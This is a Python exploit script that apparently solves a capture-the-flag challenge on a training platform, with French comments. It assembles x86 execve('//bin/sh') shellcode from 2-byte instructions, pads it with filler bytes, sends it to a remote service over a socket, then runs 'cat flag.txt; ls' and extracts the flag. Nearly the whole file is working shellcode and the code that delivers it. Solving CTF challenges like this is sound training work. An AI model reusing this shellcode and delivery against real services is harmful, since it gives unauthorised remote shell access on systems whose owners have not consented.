import sys, json, re, time, socket
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r".")
from cylab2 import CyLab

host, port = "xebec.cylabacademy.net", 40339
# instructions de exactement 2 octets (les 1 octets sont completes par un NOP)
insns = [
    "31c0",  # xor eax,eax
    "5090",  # push eax  (+nop)
    "6a68",  # push 'h'
    "6a73",  # push 's'
    "6a2f",  # push '/'
    "6a6e",  # push 'n'
    "6a69",  # push 'i'
    "6a62",  # push 'b'
    "6a2f",  # push '/'
    "6a2f",  # push '/'
    "89e3",  # mov ebx,esp  -> "//bin/sh"
    "5090",  # push eax (NULL argv)
    "5390",  # push ebx (argv[0])
    "89e1",  # mov ecx,esp
    "b00b",  # mov al,11
    "cd80",  # int 0x80
]
sc = b"".join(bytes.fromhex(i) for i in insns)
print("shellcode logique:", len(sc), "octets:", sc.hex())
payload = b""
for i in range(0, len(sc), 2):
    payload += sc[i:i + 2] + b"AA"
print("payload:", len(payload), "| 0x0a:", b"\n" in payload)
s = socket.create_connection((host, port), timeout=15)
s.settimeout(6)
time.sleep(0.3)
try:
    s.recv(200)
except Exception:
    pass
s.sendall(payload + b"\n")
time.sleep(0.5)
s.sendall(b"cat flag.txt; ls\n")
out = b""
t0 = time.time()
while time.time() - t0 < 8:
    try:
        c = s.recv(8192)
        if not c:
            break
        out += c
    except socket.timeout:
        break
s.close()
txt = out.decode("latin-1", "replace")
print("=== reponse ===")
print(txt[:700])
m = re.search(r"(?:academy|picoCTF)\{[^}]*\}", txt)
print("FLAG:", m.group(0) if m else None)
